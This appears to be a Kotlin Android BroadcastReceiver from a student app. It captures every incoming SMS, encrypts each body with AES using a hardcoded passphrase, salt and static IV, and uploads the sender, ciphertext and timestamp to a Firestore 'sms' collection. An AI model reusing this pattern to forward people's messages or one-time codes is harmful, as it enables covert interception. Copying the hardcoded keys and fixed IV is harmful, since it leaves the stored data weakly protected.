package com.example.proyekkpm.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import android.widget.Toast
import com.google.firebase.firestore.FirebaseFirestore
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

const val secretKey = "tK5UTui+DPh8lIlBxya5XVsmeDCoUl6vHhdIESMB6sQ="
const val salt = "QWlGNHNhMTJTQWZ2bGhpV3U=" // base64 decode => AiF4sa12SAfvlhiWu
const val iv = "bVQzNFNhRkQ1Njc4UUFaWA==" // base64 decode => mT34SaFD5678QAZX

class SmsReceiver : BroadcastReceiver() {

    private lateinit var db : FirebaseFirestore
    private lateinit var sharedPref : SharedPreferences

    override fun onReceive(context: Context, intent: Intent) {

        if(intent.action == null){
            return
        }

        db = FirebaseFirestore.getInstance()
        sharedPref = context.getSharedPreferences("user", Context.MODE_PRIVATE)
        val phoneNumber = sharedPref.getString("phone", "").toString()

        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        for (message in smsMessages) {
            Log.d("SIZE", smsMessages.size.toString())
            Log.d("ENCRYPT", encrypt(message.displayMessageBody).toString())

            val sms = hashMapOf(
                "owner" to phoneNumber,
                "address" to message.displayOriginatingAddress.toString(),
                "msg" to encrypt(message.displayMessageBody).toString(),
                "time" to message.timestampMillis,
            )

            db.collection("sms")
                .add(sms)
                .addOnSuccessListener {
                    Toast.makeText(context, "Add success", Toast.LENGTH_SHORT).show()
                }
                .addOnFailureListener { e ->
                    Log.w("ERROR", "Error adding document", e)
                }
        }
    }

    private fun encrypt(strToEncrypt: String) :  String? {
        try {
            val ivParameterSpec = IvParameterSpec(Base64.decode(iv, Base64.DEFAULT))
            val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1")
            val spec =  PBEKeySpec(secretKey.toCharArray(), Base64.decode(salt, Base64.DEFAULT), 10000, 256)
            val tmp = factory.generateSecret(spec)
            val secretKey =  SecretKeySpec(tmp.encoded, "AES")

            val cipher = Cipher.getInstance("AES/CBC/PKCS7Padding")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec)
            return Base64.encodeToString(cipher.doFinal(strToEncrypt.toByteArray(Charsets.UTF_8)), Base64.DEFAULT)
        }
        catch (e: Exception) {
            println("Error while encrypting: $e")
        }
        return null
    }
}